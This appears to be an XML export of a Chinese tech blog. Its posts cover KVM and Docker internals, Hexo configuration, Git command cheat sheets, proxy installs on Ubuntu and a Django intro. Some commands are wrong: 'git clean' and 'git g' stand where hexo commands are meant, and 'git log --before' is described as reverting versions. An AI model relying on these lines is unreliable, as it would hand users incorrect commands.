    <content type="text"><![CDATA[在互联网技术日益革新、产品快速迭代的今天，如何在提高资源使用率、提升效率的同时又兼顾互不干涉、安全隔离的原则，促使了虚拟化技术和容器技术的相继诞生。 虚拟化技术有KVM、VMWare等并驾齐驱，容器技术为docker独领风骚。 传统虚拟化技术与容器虚拟化技术的简要技术架构对比如下： Part.1 虚拟化技术虚拟化技术是指在同一台计算机上通过hypervisor虚拟出多个包括完整虚拟机系统镜像，每个虚拟机拥有独立的操作系统和硬件资源。 以KVM为例，下面初探一下虚拟化技术的实现原理。 1.1 KVM虚拟化技术KVM虚拟化的实现，主要是通过嵌入linux内核的kvm模块与QEMU相互配合实现全虚拟化，而两者的通信主要通过一系列针对特殊设备文件/dev/kvm的IOCTL调用实现。 Kvm模块的主要功能为cpu虚拟化+内存虚拟化，在提供虚拟化功能时，它会暴露一个/dev/kvm的接口，这个接口主要是用来创建和运行vCPU(虚拟CPU)以及分配虚拟内存空间、vCPU寄存器的读写。 而QEMU则是以动态二进制转换来创建和管理各种设备，通过IOCTL调用kvm的接口将部分CPU指令交给vCPU执行，kvm也依赖qemu模拟IO设备（磁盘，网卡，显卡等），从而实现完整意义上的全虚拟化。 从下图QEMU简化的内核代码可以管中窥豹领略两者的联系。 Qemu启动代码：可以看到，kvm提供了一个设备/dev/kvm，对kvm的控制要通过这个设备提供的io_ctl接口实现。 Kvm内核在主机上虚拟出vCPU,虚拟内存，再通过QEMU创建和管理各个虚拟I/O设备包括虚拟网卡，磁盘等，安装上OS（操作系统），实现虚拟机创建的每个虚拟机相当于独立出来的计算机。 1.2 举个例子从技术上无法理解的童鞋可以不看上面的原理，我用通俗的语言说明一下，好比我们有一个冷藏室，我有很多种类的食物需要冷藏，但是为了空间利用，快速分类和互不串味，虚拟化技术的实现就是将冷藏室隔成各个小库房，并且把冷冻机拆开组装成多个小制冷机每个房间放一个，这样小房间温度也可控，而且味道也不会串。Part.2 容器技术 容器技术是后于虚拟化技术出现的，如果说虚拟化技术的出现主要是为了解决资源调配和隔离的问题，那么容器技术解决的是应用开发、测试和部署等提升效率的问题。而Docker在众多容器解决方案中脱颖而出，俨然成为了容器技术的代表，现在就以Docker为例，介绍一下容器技术的实现原理。 2.1 DockerDocker的理念为“Build,Ship and Run Any App,Anywhere”，非常美好的愿景。为了实现这个目标，Docker通过Namespace分离进程，隔离网络接口、挂载点和进程间通信，使用Croups将CPU和内存等物理资源隔离开，这样就将一个完全对宿主机“一无所知”而且拥有“独立”资源的容器构造出来了，相比虚拟化技术，实际上容器还是容器之间共享同一个系统内核。 2.1.1 NamespaceNamespace的目的为通过抽象方法使得namespace 中的进程看起来拥有它们自己的隔离的全局系统资源实例，linux内核实现了六种namespace：Mount namespaces，UTS namespaces，IPC namespaces，PID namespaces，Network namespaces，User namespaces，分别的功能为:隔离文件系统、定义hostname和domainame、特定的进程间通信资源、独立进程ID结构、独立网络设备、用户和组ID空间。 Docker在创建一个容器的时候，会创建以上六种Namespace实例，然后将隔离的系统资源放入到相应的Namespace中，使得每个容器只能看到自己独立的系统资源。 以PID namespaces为例，Docker是怎么使容器拥有独立的PID空间的： Linux内核中通过pid_namespace隔离PID，首先来看下pid_namespace的简要数据结构： struct pid_namespace { struct kref kref; //引用计数 struct pidmap pidmap[PIDMAP_ENTRIES]; //pid分配的bitmap，如果位为1，表示这个pid已经分配了 int last_pid; //记录上次分配的pid，理论上，当前分配的pid=last_pid+1 struct task_struct *child_reaper; //表示进程结束后，需要这个child_reaper进程对这个进程进行托管 struct kmem_cache *pid_cachep; unsigned int level; //记录这个pid namespace的深度 struct pid_namespace *parent; //记录父pid namespace struct fs_pin *bacct; #endif }; 其中数组pidmap记录了PID的分配情况，每一位代表了对应偏移量的PID是否分配，保证了PID不重复。 每一个进程都会生成一个task_struct，task_struct的简单数据结构如下： struct task_struct { …………. pid_t pid; struct pid_link pids[PIDTYPE_MAX]; …………. } 其中pid的简单数据结构如下： struct pid { unsigned int level; //这个pid所在的层级 struct hlist_head tasks[PIDTYPE_MAX]; //一个hash表,又三个表头,分别是pid表头,进程组id表头,会话id表头,用于和task_struct进行关联 struct upid numbers[1]; //这个pid对应的命名空间,一个pid不仅要包含当前的pid,还有包含父命名空间,默认大小为1,所以就处于根命名空间中 }; 可以看出来，PID namespace主要通过以上三种数据结构的关联，将容器内部也就是独立的namespace中的uPID与宿主机上的PID建立起查找关系。 具体的做法为，task_struct结构体中的pid_link成员的node字段就被邻接到pid中的upid。upid通过pid_hash和pid数值关联了起来，这样就可以通过pid数值快速的找到所有命名空间的upid结构，numbers是一个struct pid的最后一个成员，利用可变数组来表示这个pid结构当前有多少个命名空间．这样Docker就实现了容器进程间PID的隔离。 其它系统资源的实现方式虽然与PID隔离有所差异，但是总体来说大同小异，都是通过linux内核的namespace实现资源隔离。 2.1.2 Croups前面介绍了Docker如何将系统资源进行隔离，下面简单介绍一下Docker如何利用Croups控制各个容器使用系系统资源。 Croups也是linux内核中提供一种机制，它的功能主要是限制、记录、隔离进程所使用的物理资源，比如：CPU、mermory、IO、network等，下面我们就看看它是如何做到的吧。 简单来说，Cgroups在接收到调用时，会给指定的进程挂上钩子，这个钩子会在资源被使用的时候触发，触发时会根据资源的类别（CPU,mermory,io等）使用对应的方法进行限制。 Croups中有一个术语叫做subsystem（子系统），也就是一个资源调度控制器，CPU subsystem负责CPU的时间分配，mermory subsystem负责mermory的使用量等。Cgroups的资源控制单位为组称之为cgroup，每个cgroup都包含一个或者多个subsystem。当一个任务加入了某个cgroup，cgroup对应的subsystem就开始工作，像上文提到的钩子就会触发subsystem进行资源的限制。 Docker 启动一个容器后，会在/sys/fs/cgroup目录下生成带有此容器ID的文件夹，里面就是调用Croups的配置文件，从而实现通过cgroups限制容器的资源使用率。 2.2 举个例子结合最开始虚拟化的例子，我们有一个冷藏室，容器化技术就好比将冷藏室隔成各个小房间（namespace），然后用导管和阀门（cgroups）将冷气输送到各个房间。相比与之前提到的“虚拟化冷藏”，这种方式占用更少的资源和扩展启动速度更快的优点。 Part.3 总结综上，虚拟化技术为用户提供了一个完整的虚拟机：包括内核在内的一个完整的系统镜像。容器化技术为应用程序提供了隔离的运行空间：每个容器内都包含一个独享的完整用户环境空间，容器之间共享同一个系统内核。 两种技术都有各自的优点，比如虚拟化有更佳的隔离性和安全性，容器化快速扩展、灵活性和易用性。也有各自的缺点，比如虚拟化技术实施难度高、更新和升级困难、相比容器过于笨重。容器化技术也存在较差的隔离性、安全性不高（宿主机被感染，所有容器受到影响）等缺点。 虽然两者的出现希望解决相同的问题，但是目前看来，并无孰优孰劣的定论。反而将两种技术结合起来，一个容器中运行一个虚拟机或者一个虚拟机中运行多个容器。这样，既保证了强隔离性和安全性的同时，也有了快速扩展、灵活性和易用性。所以说，除了世界上最好的语言PHP，技术都是不完美的，但是不能阻挡我们追求完美的步伐，就酱. 转载文章 扫码进群，我等待你的加入]]></content>
      <categories>
        <category>虚拟化</category>
      </categories>
      <tags>
        <tag>虚拟化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo在新建文章时候怎么默认在.md文件中添加categories标签]]></title>
    <url>%2F2018%2F08%2F25%2FHexo%E5%86%8D%E6%96%B0%E5%BB%BA%E6%96%87%E7%AB%A0%E6%97%B6%E5%80%99%E6%80%8E%E4%B9%88%E9%BB%98%E8%AE%A4%E5%9C%A8-md%E6%96%87%E4%BB%B6%E4%B8%AD%E6%B7%BB%E5%8A%A0categories%E6%A0%87%E7%AD%BE%2F</url>
    <content type="text"><![CDATA[我属于那种懒癌症晚期的人，所以只要可以省点力气就会千方百计的省。最近发现在写博客，新建文章时候，每次都要手动添加categories和photos标签。我实在受不了啊(苦恼＞︿＜)在我不懈的努力下，终于找到了解决办法。在博客的scaffolds文件夹里有个post.md文件，添加上需要的配置就行了。默认是只有tags标签。我们新建一篇文章后，可以看到也是只有tags标签，我们只能手动添加categories和photos标签。我们在post.md中添加需要的配置信息即可。下面是我个人的配置，你只需要按照你个人的需求设置即可。1234567---title: &#123;&#123; title &#125;&#125;date: &#123;&#123; date &#125;&#125;tags:categories:photos:--- 然后我们打开Git。1234# 清除静态页面缓存（清除 public 文件夹）git clean# 在本地生成静态页面（生成 public 文件夹）git g 你现在可以使用hexo new “new_blogname”新建一篇文章,并测试一下效果。部署1234# 启动本地服务 http://localhost:4000，进行预览调试hexo s# 远程部署，同步到 GitHubhexo d 下面我感觉十分有必要说说该模板文件的具体配置。(这部分属于进阶，你可以忽略不看，但是看完过后你对hexo一定会有个 更深刻的认识的)在hexo中文章的—分割区域属于Front-matter，用于指定个别文件的变量。以下是预先定义的参数，我们可在模板中使用这些参数值并加以利用。 参数 描述 默认值 layout 布局 title 标题 date 建立日期 文件建立日期 updated 更新日期 文件更新日期 comments 开启文章的评论功能 true tags 标签（不适用于分页） categories 分类（不适用于分页） permalink 覆盖文章网址 Hexo中有一个模板文件夹scaffolds。该文件夹主要用于设置文章的布局。注意：这不是博客网页的布局。我们刚才在设置post.md时候，里面的参数就需要从此表格中选定，我们不能随便添加额外的参数，这样会导致博客出现混乱现象。更多说明请移步:hexo Front-matter关于Scaffold文件夹的更多信息可查阅hexo模板打开scaffold文件夹可以看到三个文件。三个文件各司其职。 布局 解释 路径 注释 post 文章 source/_posts 新建一个文章文件 draft 草稿 source/_drafts 新建一个草稿文件 page 页面 source 新建一个页面文件 不过需要注意的是source文件夹里默认是没有draft和page文件的，你可以去主题的_config.yml中配置就有了。 参考:hexo写作 所以我们可以看出，我们只需要修改post.md即可配置出发表文章的模板来。 扫码进群，我等待你的加入]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Markdown</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git常用命令速查手册]]></title>
    <url>%2F2018%2F08%2F24%2FGit%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5%E8%A1%A8%2F</url>
    <content type="text"><![CDATA[Github名词释义 master: 默认开发分支 origin: 默认远程版本库 Index / Stage：暂存区 Workspace：工作区 Repository：仓库区（或本地仓库） Remote：远程仓库 Git原理 分布式版本控制 直接记录快照，而非差异比较 五个工作区域：工作区，暂存区、本地代码库、本地远程代码库、远程远程代码库 四种文件状态：未修改，已修改、已暂存、已提交，已推送（已推送=未修改） Git操作新建代码仓库1234567891011# 在当前目录新建一个Git代码库$ git init# 新建一个目录，将其初始化为Git代码库$ git init [project-name]# 下载一个项目和它的整个代码历史$ git clone [url] 配置Git的设置文件为.gitconfig，它可以在用户主目录下（全局配置），也可以在项目目录下（项目配置）。123456789101112131415161718192021222324252627282930313233# 显示当前的Git配置$ git config --list# 编辑Git配置文件$ git config -e [--global]# 设置提交代码时的用户信息$ git config [--global] user.name &quot;[name]&quot; # 修改用户名$ git config [--global] user.email &quot;[email address]&quot; # 修改邮箱地址# 修改编译器为 vim$ git config --global core.editor vim# status 缩写为 st$ git config --global alias.st status# checkout 缩写为 co$ git config --global alias.co checkout# branch 缩写为 br$ git config --global alias.br branch# commit 缩写为 ci$ git config --global alias.ci commit 增加/删除/修改文件12345678910111213141516171819202122232425262728293031323334353637#查看状态$ git status #查看变更内容$ git diff # 添加指定文件到暂存区$ git add [file1] [file2] ...# 添加指定目录到暂存区，包括子目录$ git add [dir]# 添加当前目录的所有文件到暂存区$ git add .# 添加每个变化前，都会要求确认# 对于同一个文件的多处变化，可以实现分次提交$ git add -p# 删除工作区文件，并且将这次删除放入暂存区$ git rm [file1] [file2] ...# 停止追踪指定文件，但该文件会保留在工作区$ git rm --cached [file]# 改名文件，并且将这个改名放入暂存区$ git mv [file-original] [file-renamed] 代码提交12345678910111213141516171819202122232425# 提交暂存区到仓库区,message代表说明信息$ git commit -m [message]# 提交暂存区的指定文件到仓库区$ git commit [file1] [file2] ... -m [message]# 提交工作区自上次commit之后的变化，直接到仓库区$ git commit -a# 提交时显示所有diff信息$ git commit -v# 使用一次新的commit，替代上一次提交# 如果代码没有任何新变化，则用来改写上一次commit的提交信息$ git commit --amend -m [message]# 重做上一次commit，并包括指定文件的新变化$ git commit --amend [file1] [file2] ... 分支12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#显示所有本地分支$ git branch # 列出所有远程分支$ git branch -r# 列出所有本地分支和远程分支$ git branch -a# 新建一个分支，但依然停留在当前分支$ git branch [branch-name]# 新建一个分支，与指定的远程分支建立追踪关系$ git branch --track [branch] [remote-branch]# 删除分支$ git branch -d [branch-name]# 删除远程分支$ git push origin --delete [branch-name]$ git branch -dr [remote/branch]# 撤销某一个文件当前的修改$ git chechout [FILE]# 新建一个分支，并切换到该分支$ git checkout -b [branch]# 切换到指定分支，并更新工作区$ git checkout [branch-name]# 切换到上一个分支$ git checkout -# 建立追踪关系，在现有分支与指定的远程分支之间$ git branch --set-upstream [branch] [remote-branch]# 合并指定分支到当前分支$ git merge [branch]#衍合指定分支到当前分支$ git rebase &lt;branch&gt; # 选择一个commit，合并进当前分支$ git cherry-pick [commit] 标签123456789$ git tag #列出所有本地标签$ git tag &lt;tagname&gt; #基于最新提交创建标签$ git tag -a [tagname] -m [message] # 创建标签，基于最新版本提交，附带注释信息$ git tag -a [tagname] -m [message] [CommitID] # 创建标签，基于指定的Commit，附带注释信息$ git tag -d &lt;tagname&gt; #删除标签 1234567891011121314151617181920212223# 删除远程tag$ git push origin :refs/tags/[tagName]# 查看tag信息$ git show [tag]# 提交指定tag$ git push [remote] [tag]# 提交所有tag$ git push [remote] --tags# 配合Gerrit使用$ git push origin [tagname]:refs/tags/[tagname]# 新建一个分支，指向某个tag$ git checkout -b [branch] [tag] 查看信息123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293# 显示有变更的文件$ git status# 查看指定文件状态$ git status [FILE]# 显示当前分支的版本历史$ git log# 显示commit历史，以及每次commit发生变更的文件$ git log --stat# 搜索提交历史，根据关键词$ git log -S [keyword]# 显示某个commit之后的所有变动，每个commit占据一行$ git log [tag] HEAD --pretty=format:%s# 显示某个commit之后的所有变动，其&quot;提交说明&quot;必须符合搜索条件$ git log [tag] HEAD --grep feature# 显示某个文件的版本历史，包括文件改名$ git log --follow [file]$ git whatchanged [file]# 显示指定文件相关的每一次diff$ git log -p [file]# 显示过去5次提交$ git log -5 --pretty --oneline# 显示所有提交过的用户，按提交次数排序# 查看代码库日志，简洁有图$ git log --graph --pretty=oneline --abbrev-commit -20$ git shortlog -sn# 显示指定文件是什么人在什么时间修改过$ git blame [file]# 显示暂存区和工作区的差异$ git diff# 显示暂存区和上一个commit的差异$ git diff --cached [file]# 显示工作区与当前分支最新commit之间的差异$ git diff HEAD# 查看变更内容，对比本地代码库与本地远程代码库，origin代表远程的意思$ git diff master origin/master# 显示两次提交之间的差异$ git diff [first-branch]...[second-branch]# 显示今天你写了多少行代码$ git diff --shortstat &quot;@&#123;0 day ago&#125;&quot;# 显示某次提交的元数据和内容变化$ git show [commit]# 显示某次提交发生变化的文件$ git show --name-only [commit]# 显示某次提交时，某个文件的内容$ git show [commit]:[filename]# 显示当前分支的最近几次提交$ git reflog 远程操作123456789101112131415161718192021222324252627282930313233343536373839# 下载远程仓库的所有变动$ git fetch [remote]# 取回远程仓库的变化，并与本地分支合并$ git pull [remote] [branch]# 显示所有远程仓库$ git remote -v# 显示某个远程仓库的信息$ git remote show [remote]# 增加一个新的远程仓库，并命名$ git remote add [shortname] [url]# 从远程远程库获取代码到本地远程库$ git fetch [remote]# 上传本地指定分支到远程仓库$ git push [remote] [branch]# 强行推送当前分支到远程仓库，即使有冲突$ git push [remote] --force# 推送所有分支到远程仓库$ git push [remote] --all# 下载代码及快速合并$ git pull [remote] [branch] 12345$ git push [remote] [branch] # 上传代码及快速合并，把所有文件从本地仓库推送进远程仓库$ git push &lt;remote&gt; :&lt;branch/tag-name&gt; # 删除远程分支或标签$ git push --tags # 上传所有标签 撤销123456789$ git reset --hard HEAD # 撤销工作目录中所有未提交文件的修改内容$ git checkout HEAD &lt;file&gt; # 撤销指定的未提交文件的修改内容$ git revert &lt;commit&gt; # 撤销指定的提交$ git clean -xfd # 清除所有非GIT跟踪文件，例如编译生成的内容$ git log --before=&quot;1 days&quot; # 退回到之前1天的版本 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667# 恢复暂存区的指定文件到工作区$ git checkout [file]# 恢复某个commit的指定文件到暂存区和工作区$ git checkout [commit] [file]# 恢复暂存区的所有文件到工作区$ git checkout .# 重置暂存区的指定文件，与上一次commit保持一致，但工作区不变$ git reset [file]# 将文件从暂存区中回退到工作区，git add的反操作$ git reset HEAD# 只改变提交点，工作目录与暂存区中内容都不改变$ git reset --soft HEAD# 回撤到指定版本$ git reset 版本号（前七位）# 回撤到当前版本，撤销工作目录与暂存区中的所有内容$ git reset --hard HEAD# 回撤到上一个版本$ git reset --hard HEAD^# 回撤到上上一个版本$ git reset --hard HEAD^^# 重置暂存区与工作区，与上一次commit保持一致$ git reset --hard# 重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变$ git reset [commit]# 重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致$ git reset --hard [commit]# 重置当前HEAD为指定commit，但保持暂存区和工作区不变$ git reset --keep [commit]# 新建一个commit，用来撤销指定commit# 后者的所有变化都将被前者抵消，并且应用到当前分支$ git revert [commit]# 暂时将未提交的变化移除，稍后再移入$ git stash$ git stash pop 其他12345$ git archive # 生成一个可供发布的压缩包$ git log --graph --pretty=oneline --abbrev-commit -20$ git push origin master:refs/for/master Gerrit日常开发 master 常驻分支，要求常驻分支时刻可用 feature-XXX 功能分支，新建分支用于开发新功能 bugfix-XXX 问题分支，新建分支用于修改问题下载版本 BASE_IPC_HI3518EV200_SPC0401git clone &amp; scp 新建分支1git checkout -b feature-XXX master 在新分支上完成功能修改和测试验证12git addgit commit -m &quot;XXX&quot; 将功能合并到master123git checkout master # 切换到master分支git pull --rebase # 更新代码 合并操作有如下四种方式： git merge --no-ff -m &quot;XXXX&quot; feature-XXX/bugfix-XXX 合并修改到master并commit，在master中可以查看到分支的log历史。如果产生冲突，通过git status 查看冲突文件，手动解决冲突后 git add，git commit git merge --squash -m &quot;XXXX&quot; feature-XXX/bugfix-XXX 合并修改到master分支并commit，分支的所有修改一次commit到master，无法在master中查看分支的log历史，需要稍后手动 git commit git rebase feature-XXX/bugfix-XXX 合并修改到master分支，master的修改和commit将接在分支修改的末端，合并后log中无法查看到分支的存在 git cherry-pick [Commit-ID].... 合并指定的修改到master分支，分支修改会合并到master历史log的末端，如果发生冲突，手动解决冲突后 git add，git cherry-pick --continue -m &quot;XXXX&quot;` git branch -d feature-XXX/bugfix-XXX ` 删除指定分支 上传远程服务器1git push origin master:refs/for/master git push origin master:refs/for/master 参考文章：https://mp.weixin.qq.com/s/xezQTCV9s-L0sjqkXgtCog]]></content>
      <categories>
        <category>GitHub</category>
      </categories>
      <tags>
        <tag>GitHub</tag>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[科学上网教程5-全平台软件萤火虫]]></title>
    <url>%2F2018%2F08%2F23%2F%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%E6%95%99%E7%A8%8B5-%E5%85%A8%E5%B9%B3%E5%8F%B0%E8%BD%AF%E4%BB%B6%E8%90%A4%E7%81%AB%E8%99%AB%2F</url>
    <content type="text"><![CDATA[下载 Windows: 安装版 | 单文件版 Android 4.0.3 及以上: 直接下载 | Google Play iOS 9.3 及以上: 中国 App Store | US App Store OSX: 安装版 | 单文件版 Ubuntu 64位: 安装版 | 单文件版 Ubuntu 32位: 安装版 | 单文件版 项目地址: https://github.com/yinghuocho/firefly-proxy 以Ubuntu版本为例说明。首先直接下载.deb安装包，然后进行安装。1lengyue@ubuntu:~$ sudo dpkg -i firefly_linux_amd64_install.deb 然后终端输入firefly打开即可使用。至于速度方面，我个人认为还是很可以的。动图演示：]]></content>
      <categories>
        <category>科学上网</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Ubuntu</tag>
        <tag>科学上网</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo博客显示markdown流程图]]></title>
    <url>%2F2018%2F08%2F22%2FHexo%E5%8D%9A%E5%AE%A2%E6%98%BE%E7%A4%BAmarkdown%E6%B5%81%E7%A8%8B%E5%9B%BE%2F</url>
    <content type="text"><![CDATA[Markdown语法是支持流程图、序列图的。但是我们需要安装一个插件来实现。插件地址：https://github.com/bubkoo/hexo-filter-flowchart 安装先进入你的博客根目录，然后输入以下命令1npm install --save hexo-filter-flowchart 使用打开你的hexo博客的 站点配置文件_config.yml 。然后找一个位置，把下面的代码复制进去，注意对齐和缩进。这是为了方便自定义该插件的配置选项，我们只需要修改以下少量代码就可成功配置，而不必去烦乱的代码里修改插件的配置文件。(当然即使你不去博客的配置文件中进行配置，也是可以正常使用的。如果你不会添加，请忽略此步)1234flowchart: # raphael: # optional, the source url of raphael.js # flowchart: # optional, the source url of flowchart.js options: # options used for `drawSVG` 我们可以根据自己的使用习惯进行修改，默认配置为如下所示。我们同时需要根据该默认配置来自定义配置。1234567891011&#123; &quot;raphael&quot;: &quot;https://cdnjs.cloudflare.com/ajax/libs/raphael/2.2.7/raphael.min.js&quot;, &quot;flowchart&quot;: &quot;https://cdnjs.cloudflare.com/ajax/libs/flowchart/1.6.5/flowchart.min.js&quot;, &quot;options&quot;: &#123; &quot;scale&quot;: 1, &quot;line-width&quot;: 2, &quot;line-length&quot;: 50, &quot;text-margin&quot;: 10, &quot;font-size&quot;: 12 &#125;&#125; 接下来我们可以用markdown语法画一个流程图来测试一下是否已经安装成功。语法参照1234567891011121314151617```flowst=&gt;start: Start|past:&gt;http://www.google.com[blank]e=&gt;end: End:&gt;http://www.google.comop1=&gt;operation: My Operation|pastop2=&gt;operation: Stuff|currentsub1=&gt;subroutine: My Subroutine|invalidcond=&gt;condition: Yesor No?|approved:&gt;http://www.google.comc2=&gt;condition: Good idea|rejectedio=&gt;inputoutput: catch something...|requestst-&gt;op1(right)-&gt;condcond(yes, right)-&gt;c2cond(no)-&gt;sub1(left)-&gt;op1c2(yes)-&gt;io-&gt;ec2(no)-&gt;op2-&gt;e``` 然后提交123hexo cleanhexo ghexo d 当你在你的博客中看到如下所示的图，就说明你已经成功了。]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Markdown</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo中插入HTML表格出现过多空白的解决办法]]></title>
    <url>%2F2018%2F08%2F20%2Fhexo%E4%B8%AD%E6%8F%92%E5%85%A5HTML%E8%A1%A8%E6%A0%BC%E5%87%BA%E7%8E%B0%E8%BF%87%E5%A4%9A%E7%A9%BA%E7%99%BD%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95%2F</url>
    <content type="text"><![CDATA[早先我写博客的时候，就发现Hexo中插入HTML表格会留出大量空白。虽然markdown语法也是可以生成表格的，但是写的时候特别麻烦，所以我一直是直接插入的HTML表格的，仅仅是因为简单高效。当时，我刚搭建好这个博客,所以对hexo并不是很了解。我当时以为这只是在我个人markdown语法用的不对或者是编辑器造成的，造成了表格出现大量空白，此后也并没有解决这件事，遇到需要表格的文章时，都是直接插入图片代替的，大家在一些文章中可以看到表格基本都是用图片代替了。最近我又写博客的时候，又出现了这个问题，才发现这也许是hexo的一个bug。下面开始分析并解决这个问题。我用下面的HTML代码做一个表格。12345678910&lt;table&gt; &lt;tr&gt; &lt;th&gt;姓名&lt;/th&gt; &lt;th&gt;性别&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;冰羽&lt;/td&gt; &lt;td&gt;男&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt; Tips: 出现的大量空白是为了演示使用，这里会出现一个表格。 姓名 性别 冰羽 男 可以看到在atom编辑器中预览的时候，并没有出现大量的空白。这说明并不是编辑器的问题。而我用markdown语法写出的内容也没有任何涉及到表格的，也绝对不是markdown语法的问题。我们可以在浏览器中右击“查看源代码”，找到这个表格会看到，多出很多&lt;br&gt;标签来。html中&lt;br&gt;标签用于换行。我后来在hexo的Issues中也发现了其他人出现了这个问题。然后开始各种找解决办法,下面给出两种解决办法。 解决方法1将代码改为紧凑模式，修改代码如下1&lt;table&gt;&lt;tr&gt;&lt;th&gt;姓名&lt;/th&gt;&lt;th&gt;性别&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;冰羽&lt;/td&gt;&lt;td&gt;男&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt; 也就是说代码标签之间不要留白，全部改为紧贴着的。Tips 这里会出现一个表格，没有大量空白 姓名性别冰羽男我们还可以利用这个Table Generator在线工具来编辑表格，提供了html表格和markdown表格来生成用于hexo的表格 解决方法2(推荐)123&#123;% raw %&#125;html tags &amp; content&#123;% endraw %&#125; 我们可以利用上面的格式来编写表格，我个人认为这种最为简单便捷。我们只需要把代码修改为以下这样即可。 123456789101112&#123;% raw %&#125; &lt;table&gt; &lt;tr&gt; &lt;th&gt;姓名&lt;/th&gt; &lt;th&gt;性别&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;冰羽&lt;/td&gt; &lt;td&gt;男&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt;&#123;% endraw %&#125; 姓名 性别 冰羽 男 生成的表格同样不会出现大量空白。]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Markdown</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[科学上网教程4-Linux实现科学上网]]></title>
    <url>%2F2018%2F08%2F19%2F%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%E6%95%99%E7%A8%8B4-Linux%E5%AE%9E%E7%8E%B0%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%2F</url>
    <content type="text"><![CDATA[我以前写过用openvpn在kali上实现科学上网，点击查看今天换个软件，我们用大名鼎鼎的蓝灯来实现。我试过了，Linux的蓝灯还是很稳的,我一直都在用。蓝灯的项目地址：https://github.com/getlantern/download当然，我蓝灯同时还具备了Widows、Android、Mac版本，所以基本可以满足大家的需要，但是今天只以Linux版本举例来说，其他版本用法基本相同。首先我们先下载,这是.deb安装包，适合Ubuntu、Debian、kali等系统安装。 32位下载64位下载 Tips: 官方提供的这个软件包是Ubuntu 14.04的，但是我用16.04也安装成功并可正常使用。下载完成后，我们进入蓝灯软件包所在目录。下面开始安装1lengyue@ubuntu:~$ sudo dpkg -i lantern-installer-64-bit.deb 安装成功后，我们直接在终端打开测试一下，此时你应该具备一个良好的网络环境。1lengyue@ubuntu:~$ lantern 连接可能会有点慢，但是这些完全取决于你的网速，你需要有耐心等待一会。当出现蓝灯图标变为蓝色的时候，就说明已经成功连接了。可以看到成功打开了谷歌。我个人感觉速度十分的快，而且很稳定，为了证明，请看下面的动图。怎么样，还是很可以的吧，反正我用Google搜索和看YouTube视频一点没感觉卡。好了，如果大家有更好的方法也欢迎推荐一下哦(oﾟvﾟ)ノ]]></content>
      <categories>
        <category>科学上网</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Ubuntu</tag>
        <tag>科学上网</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git命令汇总]]></title>
    <url>%2F2018%2F08%2F13%2FGit%E5%91%BD%E4%BB%A4%E6%B1%87%E6%80%BB%2F</url>
    <content type="text"><![CDATA[(以下排序按照是否常用进行)12345678910111213141516git clone # 获取远程仓库git push # 推送至远程仓库git pull # 获取最新的远程仓库分支git init # 初始化仓库git remote add # 添加远程苍老git status # 查看仓库状态git add # 向暂存区添加文件git commit # 保存仓库历史记录git log # 查看提交日志git reset # 回溯历史版本git diff # 查看更改前后差别git branch # 显示分支一览表git checkout # 创建、切换分支git merge # 合并分支git reflog # 查看当前仓库执行过的操作日志git rebase # 压缩为一个历史记录 下面是一些可以帮助深入理解Git的资料以及网站https://git-scm.com/book/zh/v2 (《Pro Git》在线阅读，还可以免费下载PDF、equb电子书)http://try.github.io/ (web上尝试操作git的网站，需要翻墙)https://learngitbranching.js.org/ (学习Git命令的在线练习网站，强烈推荐，需要翻墙)本文参考《GitHub从入门到实战》]]></content>
      <categories>
        <category>GitHub</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用Django搭建博客]]></title>
    <url>%2F2018%2F08%2F10%2F%E5%88%A9%E7%94%A8django%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%2F</url>
    <content type="text"><![CDATA[django说明8月1日，Django 2.1发布了。此次发布有以下几个重点：最低支持Python3.5，Python3.4正式被丢弃。如果你想了解更多的更新新特性，可以查阅更新日志：https://docs.djangoproject.com/en/2.1/releases/2.1/Django 是一个python的web框架。其实django架站挺复杂的。就是20篇文章也说不完整个过程。所以今天只是简述一个过程，但是你可以放心，按照本教程操作，是可以搭建出一个简易网站的，有多简易呢？只有简单的静态html网页当然美化需要后期进行处理。我们只是做出一个样板来。但是这已经是整个过程中最重要的一步了。以后美化也只是在现有基础上进行改进工作而已。首先准备一个python环境。我以Linux环境为例介绍，但是其他操作系统也可按照此方法进行搭建。本人操作环境: Ubuntu 16.04 (LTS) [本人并没有用Mac系统，只是给Ubuntu安装了Mac主题]，python2.7，django1.1.各位，以自己的实际环境为准,首先说明一点，django 1.x和django2.x的存在很大的区别，而且各版本之间存在很大的差异，不向下兼容。一切以你的环境为主。首先你应该验证一下你的python环境是否符合该django版本。12lengyue@ubuntu:~$ python -Vpython 2.7 